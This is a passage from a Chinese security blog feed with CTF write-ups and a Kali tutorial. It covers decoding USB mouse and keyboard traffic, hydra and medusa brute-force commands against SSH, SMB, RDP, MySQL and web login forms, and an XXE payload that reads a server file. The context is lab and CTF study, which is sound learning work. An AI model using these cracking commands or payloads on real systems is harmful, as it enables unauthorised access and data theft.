operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token comment"># 键盘流量的话len改为16</span>            out<span class="token operator">=</span><span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># [0,2,4,6,8,10]</span>                <span class="token keyword">if</span> i<span class="token operator">+</span><span class="token number">2</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然后就得到了所有8位数据，然后就是将其转换成坐标的格式。<br>仍然是使用python脚本进行批量转换。</p><pre class="language-python" data-language="python"><code class="language-python">nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'xy.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>posx <span class="token operator">=</span> <span class="token number">0</span>posy <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">12</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        x <span class="token operator">-=</span> <span class="token number">256</span>    <span class="token keyword">if</span> y <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        y <span class="token operator">-=</span> <span class="token number">256</span>    posx <span class="token operator">+=</span> x    posy <span class="token operator">+=</span> y    btn_flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 1 for left , 2 for right , 0 for nothing</span>    <span class="token keyword">if</span> btn_flag <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">:</span> <span class="token comment"># 1 代表左键</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posx<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posy<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201010143952968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>然后使用gnuplot画图工具进行画图。kali中安装方法</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> gnuplot</code></pre><p>使用方法不再细说。<br>还有个是使用了github的一个项目——<a href="https://github.com/WangYihang/UsbMiceDataHacker">UsbMiceDataHacker</a><br>使用方法</p><pre class="language-bash" data-language="bash"><code class="language-bash">python2 UsbMiceDataHacker.py usb2.pcap RIGHT <span class="token comment"># letf为左键</span></code></pre><h3 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h3><p>前面操作与鼠标流量处理方式相差不多，几乎相同。<br>就是加冒号处理的时候，脚本需要改一下。就是很简单的<br><img src="https://img-blog.csdnimg.cn/20201010145102971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后就是使用通用脚本将数据分析出来</p><pre class="language-python" data-language="python"><code class="language-python">mappings <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0x04</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span>  <span class="token number">0x05</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span>  <span class="token number">0x06</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span>  <span class="token number">0x0B</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span>  <span class="token number">0x0D</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span>  <span class="token number">0x13</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span>  <span class="token number">0x23</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">:</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">:</span><span class="token string">"[DEL]"</span><span class="token punctuation">,</span>  <span class="token number">0X2B</span><span class="token punctuation">:</span><span class="token string">"    "</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">:</span><span class="token string">" "</span><span class="token punctuation">,</span>  <span class="token number">0x2D</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span>  <span class="token number">0x30</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span>  <span class="token number">0x31</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span>  <span class="token number">0x34</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span>  <span class="token number">0x37</span><span class="token punctuation">:</span><span class="token string">"."</span> <span class="token punctuation">&#125;</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span><span class="token punctuation">:</span>         <span class="token keyword">continue</span>    nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> n <span class="token keyword">in</span> nums<span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token keyword">in</span> mappings<span class="token punctuation">:</span>        output <span class="token operator">+=</span> mappings<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+=</span> <span class="token string">'[unknown]'</span><span class="token keyword">print</span> <span class="token string">'output :\n'</span> <span class="token operator">+</span> output</code></pre><p>是python2的脚本。<br><img src="https://img-blog.csdnimg.cn/20201010145458941.png#pic_center" alt="m0re" loading="lazy"><br>最后flag是720593，因为<code>[DEL]</code>是删除。</p><h2 id="loading"><a href="#loading" class="headerlink" title="loading"></a>loading</h2><blockquote><p>不能把握人生的方向盘，前进还有什么意义！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux之在线密码破解</title>
      <link href="/posts/5e1256/"/>
      <url>/posts/5e1256/</url>
      
        <content type="html"><![CDATA[<p>前言：这次学习密码破解类型的知识。本篇文章是在线密码破解模块。</p><p>平时收集各种字典，或者github上的一些项目收集。</p><ol><li>放个github项目，<br>一个使用python3写的工具——<a href="https://github.com/Mebus/cupp">cupp</a><br>描述：按个人信息生成其专属字典。<br>简单使用：<br><img src="https://img-blog.csdnimg.cn/20201004112012705.png" alt="m0re" loading="lazy"><br>使用cupp这个py文件，使用<code>-i</code>参数会进入一个交互模式，下面会问一些有关被破解者的一些信息。<br><img src="https://img-blog.csdnimg.cn/20201004112238421.png" alt="m0re" loading="lazy"><br>第一是他的姓名和生日信息，<br>第二是父母的基本信息<br>第三是孩子的信息<br>还有宠物的信息，可以省略不写。<br>最后红框里的是是否要加一些关键词、一些特殊字符、一些随机数。<br>然后就会生成以他名字命名的一个字典。</li><li><code>cewl</code>一个kali中自带的工具，使用<code>--help</code>查看使用参数<br>简单使用<pre class="language-bash" data-language="bash"><code class="language-bash">cewl <span class="token number">1.1</span>.1.1 -m <span class="token number">3</span> -d <span class="token number">3</span> -e -c -v -w a.txt-m :最小单词长度-d :爬网深度-e :收集包含email地址信息-c :每个单词出现次数支持基本、摘要 身份验证支持代理</code></pre>emmm因为我自己的小网站爬不到东西，所以就爬百度了<br><img src="https://img-blog.csdnimg.cn/20201004114646650.png#pic_center" alt="m0re" loading="lazy"><br>然后看生成的字典<br><img src="https://img-blog.csdnimg.cn/20201004114806761.png" alt="m0re" loading="lazy"></li></ol><p>用户密码变型</p><ul><li>基于cewl的结果进行密码变型</li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号相互转换</li><li>字母与数字相互转换</li><li><code>P@$$w0rd</code></li></ul><ol start="3"><li><p>使用John the Ripper配置文件实现密码动态变型<br>规则保存在<code>/etc/john/john.conf</code><br>首先截取一下一个范例字典<br><img src="https://img-blog.csdnimg.cn/20201004120911440.png" alt="m0re" loading="lazy"><br>规则可以自己在<code>john.conf</code>中进行配置。<br>然后使用命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">john --wordlist<span class="token operator">=</span>pass.lst --rules --stdout <span class="token operator">></span> password.txt</code></pre><p><img src="https://img-blog.csdnimg.cn/20201004121036392.png#pic_center" alt="m0re" loading="lazy"><br>配置规则较简单的话，很快就跑出来了。<br>配置的话，在这个位置<br><img src="https://img-blog.csdnimg.cn/2020100412160469.png" alt="m0re" loading="lazy"></p></li><li><p>在线密码破解——hydra<br><img src="https://img-blog.csdnimg.cn/20201004121806933.png" alt="m0re" loading="lazy"><br>九头蛇。<br>下面是几种破解方式(命令)</p><pre class="language-bash" data-language="bash"><code class="language-bash">Windows密码破解-  hydra -l administrator -P pass.txt smb://1.1.1.1-  hydra -l administrator -P pass.txt rdp://1.1.1.1linux密码破解-  hydra -l root -P pass.txt ssh://1.1.1.1</code></pre><p>图形化界面xhydra<br><img src="https://img-blog.csdnimg.cn/20201004141454186.png" alt="m0re" loading="lazy"><br>玩不转命令行的可以尝试这个。<br>下面就使用metasploitable2靶机来试试爆破密码。<br>首先使用root登录。然后保证字典中有正确的密码。<br>保证主机能够ping通。</p><pre class="language-bash" data-language="bash"><code class="language-bash">hydra -l root -P a.txt ssh://192.168.2.133 -t <span class="token number">1</span> -vV-t参数是限制并发数，防止被拒绝连接。</code></pre><p>不过会比较慢一点。<br>不过这个是个靶机，应该不会有这样的设置，但是还是多等一会比较保险。<br><img src="https://img-blog.csdnimg.cn/20201004143739874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这里已经爆破成功，就是时间有点慢，其他的还行。如果想快一点，可以将正确密码放在靠前的位置。</p></li></ol><p>http表单身份验证。</p><pre class="language-bash" data-language="bash"><code class="language-bash">hydra -l admin -P pass.txt <span class="token number">1.1</span>.1.1 http-post-form <span class="token string">"/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php"</span> -t <span class="token number">1</span> -V</code></pre><p>进行测试。<br>注：在index.php处，是指定返回正确的标志，吐过登录成功，返回页面中肯定是包含index.php，所以就设置<code>Login:S=index.php</code><br>然后就是等待破解。</p><ol start="5"><li>在线密码破解——medusa<br>Hydra的缺点</li></ol><ul><li>稳定性差，程序时常崩溃</li><li>速度控制不好，容易触发服务屏蔽或锁死机制</li><li>没主机新建进程，没服务新建实例</li><li>大量目标破解时性能差<br>Medusa的特点</li><li>稳定性好</li><li>速度控制得当</li><li>基于线程</li><li>支持模块少于hydra（不支持RDP）</li><li>web-form支持存在缺陷<br>简单使用<pre class="language-bash" data-language="bash"><code class="language-bash">medusa 破解windows密码medusa -M smbnt -h <span class="token number">1.1</span>.1.1 -u administrator -P pass.lst -e ns -F</code></pre>参数解析<code>-F</code>表示如果检测到正确密码就不再继续检测。<br><code>-M</code>使用mod的名称<pre class="language-bash" data-language="bash"><code class="language-bash">medusa破解linux密码medusa -M <span class="token function">ssh</span> -h <span class="token number">1.1</span>.111.1 -u root -P pass.lst -e ns -F</code></pre>其他服务密码破解<pre class="language-bash" data-language="bash"><code class="language-bash">medusa -M mysql -h <span class="token number">1.1</span>.1.1 -u root -P pass.lst -e ns -Fmedusa -h <span class="token number">1.1</span>.1.1 -u admin -P pass.lst -e ns -F<span class="token comment">#表单破解</span>medusa -h <span class="token number">1.1</span>.1.1 -u admin -P pass.lst -M web-form -m FROM:<span class="token string">"dvwa/login.php"</span> -m DENY-SIGNAL:<span class="token string">"login.php"</span> -m FROM-DATA:<span class="token string">"post?user=username&amp;pass=password&amp;Login=Login"</span></code></pre>常用参数<pre class="language-bash" data-language="bash"><code class="language-bash">-n :非默认端口-s :使用SSL连接-T :并发主机数</code></pre>medusa支持的模块<br><img src="https://img-blog.csdnimg.cn/20201004152514312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>使用时，不需要加上<code>.mod</code>直接加名称就行。<br>详细使用，可以利用<code>-h</code>参数来研究。</li></ul><p>在线密码破解模块到此结束，下次学习离线密码破解。</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记—ctfshow&amp;&amp;BUU</title>
      <link href="/posts/6c60c36a/"/>
      <url>/posts/6c60c36a/</url>
      
        <content type="html"><![CDATA[<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><p>是ctfshow里的web入门的题，记几个知识点。</p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>题目描述：密钥什么的，就不要放在前端了<br>打开题目是登录框，第一想法是去尝试了万能密码。但是没有成功。然后才回过头看题目描述是前端有密钥。所以就看源代码。<br><img src="https://img-blog.csdnimg.cn/20200930092356325.png" alt="m0re" loading="lazy"><br>上面是加密方法，百度发现是前端AES加密。它会将用户输入的密码字符串进行加密。两种可行方法，第一种是解密，先百度，然后这样这样，再那样那样就解出来了。(没有使用这种)。第二种是抓包修改，绕过前端验证。将密钥修改为<code>$p</code>的字符串。发包得到flag<br><img src="https://img-blog.csdnimg.cn/20200930092911845.png" alt="m0re" loading="lazy"></p><h2 id="web-7、8"><a href="#web-7、8" class="headerlink" title="web 7、8"></a>web 7、8</h2><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。<br>版本信息部署到生产环境，两道题分别考察git泄露和svn泄露。这是简单的题，不用工具。CTFHUB的技能树也有几个这样的题，是需要用到工具的，用时参考—<a href="https://blog.csdn.net/qq_45836474/article/details/107767955#t3">https://blog.csdn.net/qq_45836474/article/details/107767955#t3</a></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>vim编辑器使用的扩展知识。<br>当我们在使用vim编辑的时候，vim会在被编辑文件同一目录下，创建一个名为filename.swp的文件，记录我们的动作。<br>编辑文件时，非正常退出编辑，就会生成一个这样的文件。<br>在次执行编辑命令就会发现，<br><img src="https://img-blog.csdnimg.cn/20200930103343945.png" alt="m0re" loading="lazy"><br>而且每次打开都是这样的，这个文件是个隐藏文件，使用<code>ls -all</code>可以看到<br><img src="https://img-blog.csdnimg.cn/20200930104123489.png" alt="m0re" loading="lazy"></p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>域名隐藏信息，解析记录的txt中有隐藏信息。<br><img src="https://img-blog.csdnimg.cn/20200930105250539.png" alt="m0re" loading="lazy"></p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>在源码中发现PDF，<br><img src="https://img-blog.csdnimg.cn/20200930112618641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>访问能看到登录地址，管理员账号密码</p><h2 id="web14-标记"><a href="#web14-标记" class="headerlink" title="web14(标记)"></a>web14(标记)</h2><p>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>提示这么明显了，打开直接看源码了，里面找editor关键字。<br><img src="https://img-blog.csdnimg.cn/20200930113905790.png#pic_center" alt="m0re" loading="lazy"><br>摸索一阵，发现editor中有东西<br><img src="https://img-blog.csdnimg.cn/20200930113956239.png" alt="m0re" loading="lazy"><br>然后点击第二行倒数第十个图标，<br><img src="https://img-blog.csdnimg.cn/20200930201103675.png" alt="m0re" loading="lazy"><br>可以遍历到所有目录，找一遍，在<code>/tmp/html/nothinghere/fl000g.txt</code>发现了这个文件。访问<code>nothinghere/fl000g.txt</code>得到flag</p><h1 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h1><h2 id="api调用-XXE"><a href="#api调用-XXE" class="headerlink" title="api调用(XXE)"></a>api调用(XXE)</h2><p>一开始没有管题目，看到题，就尝试了命令执行，但是返回的是这样的。<br><img src="https://img-blog.csdnimg.cn/20200930202725429.png" alt="m0re" loading="lazy"><br>这里回显不管写什么命令，都是在后面补上own，所以命令执行可能无从下手，所以就有看看题目了。<br>api调用是没了解过的，然后呢就有些懵，源码没有信息，也不知道改从哪里下手，做题web题，没有头绪就抓个包看看。然后发现<br><img src="https://img-blog.csdnimg.cn/20200930202915376.png" alt="m0re" loading="lazy"><br>有点奇怪，还是直接burp抓包看看。<br><img src="https://img-blog.csdnimg.cn/20200930202951762.png" alt="m0re" loading="lazy"><br>看起来好像XXE的样子。跟之前打的靶场挺像的，就回头查了查博客，果然很相似，所以就使用现成的payload进行读取文件。先尝试有回显的</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">m0re</span><span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">m0re</span> <span class="token attr-name">(message)</span><span class="token punctuation">></span></span>&lt;!ENTITY hacker SYSTEM "file:///home/ctf/flag.txt"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>m0re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200930203209164.png" alt="m0re" loading="lazy"><br>思路：找源码，没线索再抓包。</p><h2 id="hello-misc"><a href="#hello-misc" class="headerlink" title="hello_misc"></a>hello_misc</h2><p>每次做一道misc题都是满满的脑洞。奇怪的知识又增加了。<br>看这个，一张图片，一个压缩包。压缩包加密，里面放的关于flag的压缩包，根据经验，一般是先分析图片，然后再进行压缩包解密。不过起初没办法的时候，都进行尝试了，暴力破解等手段。不过没有线索。正确思路应该是这样的，首先010editor查看。发现了有个out.txt<br><img src="https://img-blog.csdnimg.cn/20201002192353427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后选择分离图片，得到了压缩包<br><img src="https://img-blog.csdnimg.cn/20201002192440663.png#pic_center" alt="m0re" loading="lazy"><br>查看没有伪加密，也不是弱口令(暴力破解需要一年以上)<br>所以必定是在图片中还有压缩包的密码，看图片的样子，很像是平时做题的时候RGB隐写时显示的样子，使用stegsolve进行解题，<br><img src="https://img-blog.csdnimg.cn/20201002192806838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>红色最低位，一张图片，将其保存为png图片。看到了内容<br><img 